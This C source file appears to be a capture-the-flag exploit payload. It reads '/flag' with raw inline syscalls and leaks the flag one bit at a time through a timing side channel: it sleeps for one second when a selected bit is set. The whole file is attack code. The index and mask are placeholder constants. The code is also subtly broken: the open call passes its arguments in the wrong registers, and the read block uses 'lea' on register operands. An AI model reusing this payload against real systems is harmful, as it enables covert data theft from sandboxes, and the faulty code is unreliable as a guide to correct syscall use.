#include <time.h>  // For struct timespec
#include <sys/syscall.h>  // For syscall numbers
#include <unistd.h>       // For syscall()
#include <fcntl.h>        // For O_RDONLY
#include <stdio.h>        // For printf
#include <stdint.h>       // For ssize_t

#define BUFFER_SIZE 256   // Define a buffer size

int main() {
    char *filename = "/flag";
	int fd;                      // File descriptor
    ssize_t bytesRead;          // Number of bytes read
    char buffer[BUFFER_SIZE];   // Buffer to store file contents

    // Open the file "/flag" using inline assembly for the syscall
    // Open the file "/flag" using inline assembly for the syscall (sys_open)
    asm volatile (
        "mov $2, %%rax;"              // SYS_open
        "mov $0, %%rdi;"              // O_RDONLY
        "lea %0, %%rsi;"              // Pointer to "/flag"
        "xor %%rdx, %%rdx;"           // No flags
        "syscall;"                    // Make the syscall
        : "=a" (fd)                  // Output: file descriptor
        : "m" (filename)             // Input: filename
        : "rdi", "rsi", "rdx"        // Clobbered registers
    );
	
	__asm__ (
        "mov $0, %%rax;"          // SYS_read
        "mov %1, %%rdi;"          // File descriptor
        "lea %2, %%rsi;"          // Pointer to buffer
        "mov %3, %%rdx;"          // Number of bytes to read
        "syscall;"                // Make syscall
        : "=a" (bytesRead)        // Output: bytes read
        : "r" (fd), "r" (buffer), "r" (BUFFER_SIZE - 1) // Inputs
        : "rdi", "rsi", "rdx", "rcx", "r11", "memory" // Clobbered registers
    );



	unsigned long i = 0xDEADBEEF;
	unsigned long j = 0xBADEAFFE;
	
	char curr = buffer[i];
	if(curr & j) {
		struct timespec ts;
		ts.tv_sec = 1;  // 1 second
		ts.tv_nsec = 0; // 0 nanoseconds

		// Inline assembly for the syscall to nanosleep
		asm volatile (
			"mov $35, %%rax \n"        // Syscall number for nanosleep (35 on x86-64 Linux)
			"mov %0, %%rdi \n"         // First argument: pointer to timespec struct
			"xor %%rsi, %%rsi \n"      // Second argument: NULL (no remaining time)
			"syscall"                  // Invoke syscall
			:                          // No output operands
			: "r" (&ts)                // Input operand: pointer to the timespec structure
			: "%rax", "%rdi", "%rsi"   // Clobbered registers
		);
	}
}
